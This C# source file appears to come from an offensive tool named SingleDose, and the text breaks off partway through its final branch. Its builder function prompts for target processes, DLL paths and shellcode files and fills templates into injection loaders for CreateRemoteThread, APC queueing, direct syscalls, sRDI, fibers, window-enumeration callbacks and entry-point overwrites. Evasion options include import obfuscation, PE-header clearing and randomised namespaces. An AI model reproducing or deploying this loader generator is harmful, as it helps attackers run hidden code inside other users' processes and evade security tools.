using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text.RegularExpressions;

namespace SingleDose
{
    partial class Program
    {
        /// <summary>
        /// Builds the contents for the .cs file based on the selected technique. Each technique has a "BODY" with several patterns such as {{MODE}} and {{TRIGGER}}, that will be replaced with
        /// appropriate information based on settings/triggers set by the user.
        /// </summary>
        /// <param name="injMode"> The mode selected by the user in Settings Menu</param>
        /// <param name="injTechnique"> The technique selected with the "build" command in Main Menu.</param>
        /// <returns></returns>
        public static void CSConstructor(string injMode, string injTechnique)
        { 
            if (injMode == "STATIC")
            {
                if (injTechnique == "CreateRemoteThread")
                {
                    string targetProcess = null;
                    string targetDLLPath = null;
                    Console.WriteLine("|   [~] Enter Target Process Name or PID: ");
                    do
                    {
                        Console.Write("|       > ");
                        targetProcess = Console.ReadLine();
                    } while (string.IsNullOrEmpty(targetProcess) && targetProcess.ToLower() != "exit");

                    if (targetProcess.ToLower() == "exit")
                    {
                        return;
                    }
                    Console.WriteLine("|");
                    if (targetProcess.EndsWith(".exe"))
                    {
                        targetProcess = targetProcess.TrimEnd('.', 'e', 'x', 'e');
                    }
                    Console.WriteLine("|   [~] Enter Target DLL Absolute Path: ");
                    do
                    {
                        Console.Write("|       > ");
                        targetDLLPath = Console.ReadLine();
                    } while (string.IsNullOrEmpty(targetDLLPath) && targetDLLPath.ToLower() != "exit");

                    if (targetDLLPath.ToLower() == "exit")
                    {
                        return;
                    }
                    Console.WriteLine("|");
                    Program.WriteLog(injMode + ": " + injTechnique + " - Target Process: "+ targetProcess + " - DLL: " + targetDLLPath, true);
                    string CSContents = DLL_CRT.BODY;
                    CSContents = ParseTriggers(CSContents);

                    Regex DLLCRTPattern;
                    DLLCRTPattern = new Regex("{{TRIGGER}}");
                    CSContents = DLLCRTPattern.Replace(CSContents, "");
                    DLLCRTPattern = new Regex("{{MODE}}");
                    CSContents = DLLCRTPattern.Replace(CSContents, DLL_CRT.STATICMODE);
                    DLLCRTPattern = new Regex("{{0\\}}"); //Targetprocess
                    CSContents = DLLCRTPattern.Replace(CSContents, targetProcess);
                    DLLCRTPattern = new Regex("{{1\\}}"); //TargetDLL
                    CSContents = DLLCRTPattern.Replace(CSContents, targetDLLPath);
                    DLLCRTPattern = new Regex("{{NAMESPACE}}");
                    CSContents = DLLCRTPattern.Replace(CSContents, GenRandomString());
                    DLLCRTPattern = new Regex("{{ARGS}}");
                    CSContents = DLLCRTPattern.Replace(CSContents,"");

                    WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false);
                }
                else if (injTechnique == "EarlyBird_QueueUserAPC")
                {
                    string spawnProcess;
                    Console.WriteLine("|   [~] Spawn process required. Enter Absolute Path: ");
                    do
                    {
                        Console.Write("|       > ");
                        spawnProcess = Console.ReadLine();
                    } while (string.IsNullOrEmpty(spawnProcess) && spawnProcess.ToLower() != "exit");

                    if (spawnProcess.ToLower() == "exit")
                    {
                        return;
                    }

                    string shellCodePath;
                    Console.WriteLine("|   [~] Enter path to shellcode: ");
                    do
                    {
                        Console.Write("|       > ");
                        shellCodePath = Console.ReadLine();
                    } while (!File.Exists(shellCodePath) && shellCodePath.ToLower() != "exit");

                    if (shellCodePath.ToLower() == "exit")
                    {
                        return;
                    }
                    Console.WriteLine("|");
                    Program.WriteLog(injMode + ": " + injTechnique + " - Spawn: " + spawnProcess + " - Shellcode: " + shellCodePath, true);
                    byte[] shellCode = File.ReadAllBytes(shellCodePath);
                    string byteToString = ShellcodeBytesToString(shellCode, 1000, GenRandomString());
                    string CSContents = EB_QUAPC.BODY;
                    CSContents = ParseTriggers(CSContents);

                    Regex QueuePattern;
                    //Clear remaining trigger.
                    QueuePattern = new Regex("{{TRIGGER}}");
                    CSContents = QueuePattern.Replace(CSContents, "");
                    QueuePattern = new Regex("{{MODE}}");
                    CSContents = QueuePattern.Replace(CSContents,EB_QUAPC.STATICMODE);
                    QueuePattern = new Regex("{{SHELLCODE}}");
                    CSContents = QueuePattern.Replace(CSContents,byteToString);
                    QueuePattern = new Regex("{{SPAWN}}");
                    CSContents = QueuePattern.Replace(CSContents, "@\""+spawnProcess+"\"");
                    QueuePattern = new Regex("{{NAMESPACE}}");
                    CSContents = QueuePattern.Replace(CSContents, GenRandomString());
                    QueuePattern = new Regex("{{ARGS}}");
                    CSContents = QueuePattern.Replace(CSContents, "");

                    WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false);
                }
                else if (injTechnique == "Suspend_QueueUserAPC")//need to do
                {

                    string setPID;
                    Console.WriteLine("|   [~] Enter Target PID: ");
                    do
                    {
                        Console.Write("|       > ");
                        setPID = Console.ReadLine();
                    } while (string.IsNullOrEmpty(setPID) && setPID.ToLower() != "exit");

                    if (setPID.ToLower() == "exit")
                    {
                        return;
                    }
                    Console.WriteLine("|");
                    string shellCodePath;
                    Console.WriteLine("|   [~] Enter path to shellcode: ");
                    do
                    {
                        Console.Write("|       > ");
                        shellCodePath = Console.ReadLine();
                    } while (!File.Exists(shellCodePath) && shellCodePath.ToLower() != "exit");

                    if (shellCodePath.ToLower() == "exit")
                    {
                        return;
                    }
                    Console.WriteLine("|");
                    Program.WriteLog(injMode + ": " + injTechnique + " - Target PID: " + setPID + " - Shellcode: " + shellCodePath, true);
                    byte[] shellCode = File.ReadAllBytes(shellCodePath);
                    string byteToString = ShellcodeBytesToString(shellCode, 1000, GenRandomString());
                    string CSContents = Suspend_QueueUserAPC.BODY;
                    CSContents = ParseTriggers(CSContents);

                    Regex QueuePattern;
                    //Clear remaining trigger.
                    QueuePattern = new Regex("{{TRIGGER}}");
                    CSContents = QueuePattern.Replace(CSContents, "");
                    QueuePattern = new Regex("{{MODE}}");
                    CSContents = QueuePattern.Replace(CSContents, Suspend_QueueUserAPC.STATICMODE);
                    QueuePattern = new Regex("{{SHELLCODE}}");
                    CSContents = QueuePattern.Replace(CSContents, byteToString);
                    QueuePattern = new Regex("{{PROCESSID}}");
                    CSContents = QueuePattern.Replace(CSContents, setPID);
                    QueuePattern = new Regex("{{NAMESPACE}}");
                    CSContents = QueuePattern.Replace(CSContents, GenRandomString());
                    QueuePattern = new Regex("{{ARGS}}");
                    CSContents = QueuePattern.Replace(CSContents, "");

                    WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false);
                }
                else if (injTechnique == "Syscall_CreateThread")
                {
                    string shellCodePath;
                    Console.WriteLine("|   [~] Enter path to shellcode: ");
                    do
                    {
                        Console.Write("|       > ");
                        shellCodePath = Console.ReadLine();
                    } while (!File.Exists(shellCodePath) && shellCodePath.ToLower() != "exit");

                    if (shellCodePath.ToLower() == "exit")
                    {
                        return;
                    }
                    Console.WriteLine("|");
                    Program.WriteLog(injMode+": " + injTechnique + " - Shellcode:" + shellCodePath, true);
                    byte[] shellCode = File.ReadAllBytes(shellCodePath);
                    string byteToString = ShellcodeBytesToString(shellCode, 1000, GenRandomString());
                    string CSContents = SYSCALL_CT.BODY;
                    CSContents = ParseTriggers(CSContents);
                    
                    Regex syscallPattern;
                    //Clear remaining trigger.
                    syscallPattern = new Regex("{{TRIGGER}}");
                    CSContents = syscallPattern.Replace(CSContents, "");
                    syscallPattern = new Regex("{{MODE}}");
                    CSContents = syscallPattern.Replace(CSContents, SYSCALL_CT.STATIC);
                    syscallPattern = new Regex("{{SHELLCODE}}");
                    CSContents = syscallPattern.Replace(CSContents, byteToString);
                    syscallPattern = new Regex("{{NAMESPACE}}");
                    CSContents = syscallPattern.Replace(CSContents, GenRandomString());
                    syscallPattern = new Regex("{{ARGS}}");
                    CSContents = syscallPattern.Replace(CSContents, "");
                    
                    WriteCS(CSContents, injTechnique, Settings.OutputDirectory, true);
                }
                else if (injTechnique == "SRDI")
                {
                    SRDIClass srdiClass = new SRDIClass();
                    string dllPath;
                    Console.WriteLine("|   [~] Please enter absolute path to DLL. This can be on this host or the target:");
                    do
                    {
                        Console.Write("|       > ");
                        dllPath = Console.ReadLine();
                    } while (!dllPath.Contains(":\\") && dllPath.ToLower() != "exit");

                    if (dllPath.ToLower() == "exit")
                    {
                        return;
                    }

                    if (File.Exists(dllPath))
                    {
                        Console.WriteLine("|   [*] Converting {0} byte array.", dllPath);
                        srdiClass.DLLData = File.ReadAllBytes(dllPath);
                    }
                    else
                    {
                        srdiClass.DLLFilepath = dllPath;
                    }
                    string functionName;
                    Console.WriteLine("|\n|   [OPTIONAL] Enter the name of an exported function to call after DLLMain:");
                    Console.Write("|       > ");
                    functionName = Console.ReadLine();
                    if ((functionName != null) && (functionName != ""))
                    {
                        srdiClass.HashFunction = functionName;
                    }

                    string userData;
                    Console.WriteLine("|\n|   [OPTIONAL] Enter any additional data to pass to call after DLLMain:");
                    Console.Write("|       > ");
                    userData = Console.ReadLine();
                    if ((userData != null) && (userData != ""))
                    {
                        srdiClass.AdditionalData = userData;
                    }

                    string obfuscateImports;
                    Console.WriteLine("|\n|   [OPTIONAL] Would you like to Obfuscate imports? (Y/N)");
                    do
                    {
                        Console.Write("|       > ");
                        obfuscateImports = Console.ReadLine();
                    } while (obfuscateImports.ToUpper() != "Y" && obfuscateImports.ToUpper() != "N" && obfuscateImports != "" && obfuscateImports.ToLower() != "exit");

                    if (obfuscateImports.ToLower() == "exit")
                    {
                        return;
                    }
                    if (obfuscateImports.ToUpper() == "Y")
                    {
                        srdiClass.ObfuscateImports = true;
                    }
                    else if (obfuscateImports.ToUpper() == "N")
                    {
                        srdiClass.ObfuscateImports = false;
                    }

                    if (srdiClass.ObfuscateImports)
                    {
                        Console.WriteLine("|\n|   [OPTIONAL] Enter seconds to pause between loading imports? (Default: 0)");
                        string importDelay;
                        int parsedInt;
                        do
                        {
                            Console.Write("|       > ");
                            importDelay = Console.ReadLine();

                        } while (!int.TryParse(importDelay, out parsedInt) && importDelay != "" && importDelay.ToLower() != "exit");

                        if (importDelay.ToLower() == "exit")
                        {
                            return;
                        }
                        if (importDelay != "0")
                        {
                            srdiClass.ImportDelay = parsedInt;
                        }
                        else
                        {
                            srdiClass.ImportDelay = 0;
                        }

                    }
                    string clearHeader;
                    Console.WriteLine("|\n|   [OPTIONAL] Would you like to clear the PE header on load? (Y/N)");
                    do
                    {
                        Console.Write("|       > ");
                        clearHeader = Console.ReadLine();
                    } while (clearHeader.ToUpper() != "Y" && clearHeader.ToUpper() != "N" && clearHeader != "" && clearHeader.ToLower() != "exit");

                    if (clearHeader.ToLower() == "exit")
                    {
                        return;
                    }

                    Console.WriteLine("|");
                    if (clearHeader.ToUpper() == "Y")
                    {
                        srdiClass.ClearHeader = true;
                    } 
                    else if (clearHeader.ToUpper() == "N")
                    {
                        srdiClass.ClearHeader = false;
                    }

                    Program.WriteLog(injMode + ": " + injTechnique + " - DLL: " + dllPath, true);
                    string CSContents = sRDI.BODY;
                    CSContents = ParseTriggers(CSContents);

                    Regex replacePattern;
                    //Clear remaining trigger.
                    replacePattern = new Regex("{{TRIGGER}}");
                    CSContents = replacePattern.Replace(CSContents, "");
                    replacePattern = new Regex("{{MODE}}");
                    CSContents = replacePattern.Replace(CSContents, sRDI.STATICMODE);
                    replacePattern = new Regex("{{DLLCONTENTS}}");
                    if (srdiClass.DLLFilepath != null)
                    {
                        CSContents = replacePattern.Replace(CSContents, sRDI.READFILE);
                        replacePattern = new Regex("{{FILEPATH}}");
                        CSContents = replacePattern.Replace(CSContents, srdiClass.DLLFilepath);
                    } 
                    else if (srdiClass.DLLData.Length > 0)
                    {
                        CSContents = replacePattern.Replace(CSContents, sRDI.BYTES);
                        string byteToString = "0x" + ByteArrayToString(srdiClass.DLLData);
                        replacePattern = new Regex("{{BYTES}}");
                        CSContents = replacePattern.Replace(CSContents, byteToString);
                    }

                    replacePattern = new Regex("{{FUNCTIONNAME}}");
                    if (srdiClass.HashFunction != null)
                    {
                        CSContents = replacePattern.Replace(CSContents, srdiClass.HashFunction);
                    }
                    else
                    {
                        CSContents = replacePattern.Replace(CSContents, "0");
                    }
                    replacePattern = new Regex("{{USERDATA}}");
                    if (srdiClass.AdditionalData != null)
                    {
                        CSContents = replacePattern.Replace(CSContents, srdiClass.AdditionalData);
                    }
                    else
                    {
                     
                        CSContents = replacePattern.Replace(CSContents, "");
                    }

                    replacePattern = new Regex("{{OBFUSCATE}}");
                    if (srdiClass.ObfuscateImports)
                    {
                        CSContents = replacePattern.Replace(CSContents, "true");
                    }
                    else
                    {
                        CSContents = replacePattern.Replace(CSContents, "false");
                    }

                    replacePattern = new Regex("{{IMPORTDELAY}}");
                    CSContents = replacePattern.Replace(CSContents, srdiClass.ImportDelay.ToString());

                    replacePattern = new Regex("{{CLEARHEADER}}");
                    if (srdiClass.ClearHeader)
                    {
                        CSContents = replacePattern.Replace(CSContents, "true");
                    }
                    else
                    {
                        CSContents = replacePattern.Replace(CSContents, "false");
                    }
                    replacePattern = new Regex("{{NAMESPACE}}");
                    CSContents = replacePattern.Replace(CSContents, GenRandomString());
                    replacePattern = new Regex("{{ARGS}}");
                    CSContents = replacePattern.Replace(CSContents,"");
                    
                    WriteCS(CSContents, injTechnique, Settings.OutputDirectory, true);
                }
                else if (injTechnique == "Fiber_Execution")
                {
                    string shellCodePath;
                    Console.WriteLine("|   [~] Enter path to shellcode: ");
                    do
                    {
                        Console.Write("|       > ");
                        shellCodePath = Console.ReadLine();
                    } while (!File.Exists(shellCodePath) && shellCodePath.ToLower() != "exit");

                    if (shellCodePath.ToLower() == "exit")
                    {
                        return;
                    }
                    Console.WriteLine("|");
                    Program.WriteLog(injMode + ": " + injTechnique + " - Shellcode: " + shellCodePath, true);
                    byte[] shellCode = File.ReadAllBytes(shellCodePath);
                    string byteToString =  ShellcodeBytesToString(shellCode, 1000, GenRandomString());
                    string CSContents = FiberInject.Body;
                    CSContents = ParseTriggers(CSContents);

                    Regex regPattern;
                    //Clear remaining trigger.
                    regPattern = new Regex("{{TRIGGER}}");
                    CSContents = regPattern.Replace(CSContents, "");
                    regPattern = new Regex("{{MODE}}");
                    CSContents = regPattern.Replace(CSContents, FiberInject.STATIC);
                    regPattern = new Regex("{{SHELLCODE}}");
                    CSContents = regPattern.Replace(CSContents, byteToString);
                    regPattern = new Regex("{{NAMESPACE}}");
                    CSContents = regPattern.Replace(CSContents, GenRandomString());
                    regPattern = new Regex("{{ARGS}}");
                    CSContents = regPattern.Replace(CSContents, "");
                    
                    WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false);
                }
                else if (injTechnique == "EnumWindows")
                {
                    string shellCodePath;
                    Console.WriteLine("|   [~] Enter path to shellcode: ");
                    do
                    {
                        Console.Write("|       > ");
                        shellCodePath = Console.ReadLine();
                    } while (!File.Exists(shellCodePath) && shellCodePath.ToLower() != "exit");

                    if (shellCodePath.ToLower() == "exit")
                    {
                        return;
                    }
                    Console.WriteLine("|");
                    Program.WriteLog(injMode + ": " + injTechnique + " - Shellcode: " + shellCodePath, true);
                    byte[] shellCode = File.ReadAllBytes(shellCodePath);
                    string byteToString = ShellcodeBytesToString(shellCode, 1000, GenRandomString());

                    string CSContents = EnumWindows.Body;
                    CSContents = ParseTriggers(CSContents);

                    Regex regPattern;
                    //Clear remaining trigger.
                    regPattern = new Regex("{{TRIGGER}}");
                    CSContents = regPattern.Replace(CSContents, "");
                    regPattern = new Regex("{{MODE}}");
                    CSContents = regPattern.Replace(CSContents, EnumWindows.STATIC);
                    regPattern = new Regex("{{SHELLCODE}}");
                    CSContents = regPattern.Replace(CSContents, byteToString);
                    regPattern = new Regex("{{NAMESPACE}}");
                    CSContents = regPattern.Replace(CSContents, GenRandomString());
                    regPattern = new Regex("{{ARGS}}");
                    CSContents = regPattern.Replace(CSContents, "");
                    
                    WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false);
                }
                else if (injTechnique == "EnumChildWindows")
                {
                    string shellCodePath;
                    Console.WriteLine("|   [~] Enter path to shellcode: ");
                    do
                    {
                        Console.Write("|       > ");
                        shellCodePath = Console.ReadLine();
                    } while (!File.Exists(shellCodePath) && shellCodePath.ToLower() != "exit");
                    
                    if (shellCodePath.ToLower() == "exit")
                    {
                        return;
                    }

                    Program.WriteLog(injMode + ": " + injTechnique + " - Shellcode: " + shellCodePath, true);

                    byte[] shellCode = File.ReadAllBytes(shellCodePath);
                    string byteToString = ShellcodeBytesToString(shellCode, 1000, GenRandomString());
                    string CSContents = EnumChildWindows.Body;
                    CSContents = ParseTriggers(CSContents);

                    Regex regPattern;
                    //Clear remaining trigger.
                    regPattern = new Regex("{{TRIGGER}}");
                    CSContents = regPattern.Replace(CSContents, "");
                    regPattern = new Regex("{{MODE}}");
                    CSContents = regPattern.Replace(CSContents, EnumChildWindows.STATIC);
                    regPattern = new Regex("{{SHELLCODE}}");
                    CSContents = regPattern.Replace(CSContents, byteToString);
                    regPattern = new Regex("{{NAMESPACE}}");
                    CSContents = regPattern.Replace(CSContents, GenRandomString());
                    regPattern = new Regex("{{ARGS}}");
                    CSContents = regPattern.Replace(CSContents, "");
                    WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false);
                }
                else if (injTechnique == "EnumDateFormatsEx")
                {
                    string shellCodePath;
                    Console.WriteLine("|   [~] Enter path to shellcode: ");
                    do
                    {
                        Console.Write("|       > ");
                        shellCodePath = Console.ReadLine();
                    } while (!File.Exists(shellCodePath) && shellCodePath.ToLower() != "exit");

                    if (shellCodePath.ToLower() == "exit")
                    {
                        return;
                    }

                    Program.WriteLog(injMode + ": " + injTechnique + " - Shellcode: " + shellCodePath, true);

                    byte[] shellCode = File.ReadAllBytes(shellCodePath);
                    string byteToString = ShellcodeBytesToString(shellCode, 1000, GenRandomString());

                    string CSContents = EnumDateFormatsEx.Body;
                    CSContents = ParseTriggers(CSContents);

                    Regex regPattern;
                    //Clear remaining trigger.
                    regPattern = new Regex("{{TRIGGER}}");
                    CSContents = regPattern.Replace(CSContents, "");
                    regPattern = new Regex("{{MODE}}");
                    CSContents = regPattern.Replace(CSContents, EnumDateFormatsEx.STATIC);
                    regPattern = new Regex("{{SHELLCODE}}");
                    CSContents = regPattern.Replace(CSContents, byteToString);
                    regPattern = new Regex("{{NAMESPACE}}");
                    CSContents = regPattern.Replace(CSContents, GenRandomString());
                    regPattern = new Regex("{{ARGS}}");
                    CSContents = regPattern.Replace(CSContents, "");
                    WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false);
                }
                else if (injTechnique == "EnumDesktops")
                {
                    string shellCodePath;
                    Console.WriteLine("|   [~] Enter path to shellcode: ");
                    do
                    {
                        Console.Write("|       > ");
                        shellCodePath = Console.ReadLine();
                    } while (!File.Exists(shellCodePath) && shellCodePath.ToLower() != "exit");

                    if (shellCodePath.ToLower() == "exit")
                    {
                        return;
                    }

                    Program.WriteLog(injMode + ": " + injTechnique + " - Shellcode: " + shellCodePath, true);
                    byte[] shellCode = File.ReadAllBytes(shellCodePath);
                    string byteToString = ShellcodeBytesToString(shellCode, 1000, GenRandomString());
                    string CSContents = EnumDesktops.Body;
                    CSContents = ParseTriggers(CSContents);

                    Regex regPattern;
                    //Clear remaining trigger.
                    regPattern = new Regex("{{TRIGGER}}");
                    CSContents = regPattern.Replace(CSContents, "");
                    regPattern = new Regex("{{MODE}}");
                    CSContents = regPattern.Replace(CSContents, EnumDesktops.STATIC);
                    regPattern = new Regex("{{SHELLCODE}}");
                    CSContents = regPattern.Replace(CSContents, byteToString);
                    regPattern = new Regex("{{NAMESPACE}}");
                    CSContents = regPattern.Replace(CSContents, GenRandomString());
                    regPattern = new Regex("{{ARGS}}");
                    CSContents = regPattern.Replace(CSContents, "");
                    WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false);
                }
                else if (injTechnique == "AddressOfEntryPoint")
                {
                    string spawnProcess;
                    Console.WriteLine("|   [~] Spawn process required. Enter Absolute Path: ");
                    do
                    {
                        Console.Write("|       > ");
                        spawnProcess = Console.ReadLine();
                    } while (string.IsNullOrEmpty(spawnProcess) && spawnProcess.ToLower() != "exit");

                    if (spawnProcess.ToLower() == "exit")
                    {
                        return;
                    }

                    string shellCodePath;
                    Console.WriteLine("|   [~] Enter path to shellcode: ");
                    do
                    {
                        Console.Write("|       > ");
                        shellCodePath = Console.ReadLine();
                    } while (!File.Exists(shellCodePath) && shellCodePath.ToLower() != "exit");

                    if (shellCodePath.ToLower() == "exit")
                    {
                        return;
                    }
                    Console.WriteLine("|");
                    Program.WriteLog(injMode + ": " + injTechnique + " - Spawn: " + spawnProcess + " - Shellcode: " + shellCodePath, true);
                    byte[] shellCode = File.ReadAllBytes(shellCodePath);
                    string byteToString = ShellcodeBytesToString(shellCode, 1000, GenRandomString());
                    string CSContents = ADDRESSOFENTRYPOINT.BODY;
                    CSContents = ParseTriggers(CSContents);

                    Regex QueuePattern;
                    //Clear remaining trigger.
                    QueuePattern = new Regex("{{TRIGGER}}");
                    CSContents = QueuePattern.Replace(CSContents, "");
                    QueuePattern = new Regex("{{MODE}}");
                    CSContents = QueuePattern.Replace(CSContents, EB_QUAPC.STATICMODE);
                    QueuePattern = new Regex("{{SHELLCODE}}");
                    CSContents = QueuePattern.Replace(CSContents, byteToString);
                    QueuePattern = new Regex("{{SPAWN}}");
                    CSContents = QueuePattern.Replace(CSContents, "@\"" + spawnProcess + "\"");
                    QueuePattern = new Regex("{{NAMESPACE}}");
                    CSContents = QueuePattern.Replace(CSContents, GenRandomString());
                    QueuePattern = new Regex("{{ARGS}}");
                    CSContents = QueuePattern.Replace(CSContents, "");

                    WriteCS(CSContents, injTechnique, Settings.OutputDirectory, true);
                }
            }
            else if (injMode == "DYNAMIC")
            {
                if (injTechnique == "CreateRemoteThread")
                {
                    Program.WriteLog(injMode + ": " + injTechnique, true);

                    string CSContents = DLL_CRT.BODY;
                    CSContents = ParseTriggers(CSContents);

                    Regex DLLCRTPattern;
                    DLLCRTPattern = new Regex("{{TRIGGER}}");
                    CSContents = DLLCRTPattern.Replace(CSContents, "");
                    DLLCRTPattern = new Regex("{{MODE}}");
                    CSContents = DLLCRTPattern.Replace(CSContents, DLL_CRT.DYNAMICMODE);
                    DLLCRTPattern = new Regex("{{NAMESPACE}}");
                    CSContents = DLLCRTPattern.Replace(CSContents, GenRandomString());
                    DLLCRTPattern = new Regex("{{ARGS}}");
                    CSContents = DLLCRTPattern.Replace(CSContents, DLL_CRT.DYNAMICARGPARSE);

                    WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false);
                }
                else if (injTechnique == "EarlyBird_QueueUserAPC")
                {
                    Program.WriteLog(injMode + ": " + injTechnique, true);

                    string CSContents = EB_QUAPC.BODY;
                    CSContents = ParseTriggers(CSContents);

                    Regex QueuePattern;
                    //Clear remaining trigger.
                    QueuePattern = new Regex("{{TRIGGER}}");
                    CSContents = QueuePattern.Replace(CSContents, "");
                    QueuePattern = new Regex("{{MODE}}");
                    CSContents = QueuePattern.Replace(CSContents, EB_QUAPC.DYNAMICMODE);
                    QueuePattern = new Regex("{{SPAWN}}");
                    CSContents = QueuePattern.Replace(CSContents, "parsedArgs.Spawn");
                    QueuePattern = new Regex("{{NAMESPACE}}");
                    CSContents = QueuePattern.Replace(CSContents, GenRandomString());
                    QueuePattern = new Regex("{{ARGS}}");
                    CSContents = QueuePattern.Replace(CSContents, EB_QUAPC.DYNAMICARGPARSE);

                    WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false);
                }
                else if (injTechnique == "Suspend_QueueUserAPC")
                {
                    Program.WriteLog(injMode + ": " + injTechnique, true);

                    string CSContents = Suspend_QueueUserAPC.BODY;
                    CSContents = ParseTriggers(CSContents);

                    Regex QueuePattern;
                    //Clear remaining trigger.
                    QueuePattern = new Regex("{{TRIGGER}}");
                    CSContents = QueuePattern.Replace(CSContents, "");
                    QueuePattern = new Regex("{{MODE}}");
                    CSContents = QueuePattern.Replace(CSContents, Suspend_QueueUserAPC.DYNAMICMODE);
                    QueuePattern = new Regex("{{NAMESPACE}}");
                    CSContents = QueuePattern.Replace(CSContents, GenRandomString());
                    QueuePattern = new Regex("{{ARGS}}");
                    CSContents = QueuePattern.Replace(CSContents, Suspend_QueueUserAPC.DYNAMICARGPARSE);

                    WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false);
                }
                else if (injTechnique == "Syscall_CreateThread")
                {
                    Program.WriteLog(injMode + ": " + injTechnique, true);
                    string CSContents = SYSCALL_CT.BODY;
                    CSContents = ParseTriggers(CSContents);

                    Regex syscallPattern;
                    //Clear remaining trigger.
                    syscallPattern = new Regex("{{TRIGGER}}");
                    CSContents = syscallPattern.Replace(CSContents, "");
                    syscallPattern = new Regex("{{MODE}}");
                    CSContents = syscallPattern.Replace(CSContents, SYSCALL_CT.DYNAMIC);
                    syscallPattern = new Regex("{{NAMESPACE}}");
                    CSContents = syscallPattern.Replace(CSContents, GenRandomString());
                    syscallPattern = new Regex("{{ARGS}}");
                    CSContents = syscallPattern.Replace(CSContents, SYSCALL_CT.DYNAMIC_ARGPARSE);

                    WriteCS(CSContents, injTechnique, Settings.OutputDirectory, true);
                }
                else if (injTechnique == "SRDI")
                {
                    Program.WriteLog(injMode + ": " + injTechnique, true);
                    string CSContents = sRDI.BODY;
                    CSContents = ParseTriggers(CSContents);

                    Regex replacePattern;
                    //Clear remaining trigger.
                    replacePattern = new Regex("{{TRIGGER}}");
                    CSContents = replacePattern.Replace(CSContents, "");
                    replacePattern = new Regex("{{MODE}}");
                    CSContents = replacePattern.Replace(CSContents, sRDI.DYNAMICMODE);
                    replacePattern = new Regex("{{NAMESPACE}}");
                    CSContents = replacePattern.Replace(CSContents, GenRandomString());
                    replacePattern = new Regex("{{ARGS}}");
                    CSContents = replacePattern.Replace(CSContents, sRDI.DYNAMICARGS);

                    WriteCS(CSContents, injTechnique, Settings.OutputDirectory, true);
                }
                else if (injTechnique == "Fiber_Execution")
                {
                    Program.WriteLog(injMode + ": " + injTechnique, true);
                    string CSContents = FiberInject.Body;
                    CSContents = ParseTriggers(CSContents);

                    Regex regPattern;
                    //Clear remaining trigger.
                    regPattern = new Regex("{{TRIGGER}}");
                    CSContents = regPattern.Replace(CSContents, "");
                    regPattern = new Regex("{{MODE}}");
                    CSContents = regPattern.Replace(CSContents, FiberInject.DYNAMIC);
                    regPattern = new Regex("{{NAMESPACE}}");
                    CSContents = regPattern.Replace(CSContents, GenRandomString());
                    regPattern = new Regex("{{ARGS}}");
                    CSContents = regPattern.Replace(CSContents, FiberInject.DYNAMIC_ARGPARSE);

                    WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false); 
                }
                else if (injTechnique == "EnumWindows")
                {
                    Program.WriteLog(injMode + ": " + injTechnique, true);
                    string CSContents = EnumWindows.Body;
                    CSContents = ParseTriggers(CSContents);

                    Regex regPattern;
                    //Clear remaining trigger.
                    regPattern = new Regex("{{TRIGGER}}");
                    CSContents = regPattern.Replace(CSContents, "");
                    regPattern = new Regex("{{MODE}}");
                    CSContents = regPattern.Replace(CSContents, EnumWindows.DYNAMIC);
                    regPattern = new Regex("{{NAMESPACE}}");
                    CSContents = regPattern.Replace(CSContents, GenRandomString());
                    regPattern = new Regex("{{ARGS}}");
                    CSContents = regPattern.Replace(CSContents, EnumWindows.DYNAMIC_ARGPARSE);
                    
                    WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false);
                }
                else if (injTechnique == "EnumChildWindows")
                {
                    Program.WriteLog(injMode + ": " + injTechnique, true);
                    string CSContents = EnumChildWindows.Body;
                    CSContents = ParseTriggers(CSContents);

                    Regex regPattern;
                    //Clear remaining trigger.
                    regPattern = new Regex("{{TRIGGER}}");
                    CSContents = regPattern.Replace(CSContents, "");
                    regPattern = new Regex("{{MODE}}");
                    CSContents = regPattern.Replace(CSContents, EnumChildWindows.DYNAMIC);
                    regPattern = new Regex("{{NAMESPACE}}");
                    CSContents = regPattern.Replace(CSContents, GenRandomString());
                    regPattern = new Regex("{{ARGS}}");
                    CSContents = regPattern.Replace(CSContents, EnumChildWindows.DYNAMIC_ARGPARSE);
                    
                    WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false);
                }
                else if (injTechnique == "EnumDateFormatsEx")
                {
                    Program.WriteLog(injMode + ": " + injTechnique, true);
                    string CSContents = EnumDateFormatsEx.Body;
                    CSContents = ParseTriggers(CSContents);

                    Regex regPattern;
                    //Clear remaining trigger.
                    regPattern = new Regex("{{TRIGGER}}");
                    CSContents = regPattern.Replace(CSContents, "");
                    regPattern = new Regex("{{MODE}}");
                    CSContents = regPattern.Replace(CSContents, EnumDateFormatsEx.DYNAMIC);
                    regPattern = new Regex("{{NAMESPACE}}");
                    CSContents = regPattern.Replace(CSContents, GenRandomString());
                    regPattern = new Regex("{{ARGS}}");
                    CSContents = regPattern.Replace(CSContents, EnumDateFormatsEx.DYNAMIC_ARGPARSE);
                    
                    WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false);
                }
                else if (injTechnique == "EnumDesktops")
                {
                    Program.WriteLog(injMode + ": " + injTechnique, true);
                    string CSContents = EnumDesktops.Body;
                    CSContents = ParseTriggers(CSContents);

                    Regex regPattern;
                    //Clear remaining trigger.
                    regPattern = new Regex("{{TRIGGER}}");
                    CSContents = regPattern.Replace(CSContents, "");
                    regPattern = new Regex("{{MODE}}");
                    CSContents = regPattern.Replace(CSContents, EnumDesktops.DYNAMIC);
                    regPattern = new Regex("{{NAMESPACE}}");
                    CSContents = regPattern.Replace(CSContents, GenRandomString());
                    regPattern = new Regex("{{ARGS}}");
                    CSContents = regPattern.Replace(CSContents, EnumDesktops.DYNAMIC_ARGPARSE);
                    
                    WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false);
                }
                else if (injTechnique == "AddressOfEntryPoint")
                {
                    Program.WriteLog(injMode + ": " + injTechnique, true);

                    string CSContents = ADDRESSOFENTRYPOINT.BODY;
                    CSContents = ParseTriggers(CSContents);

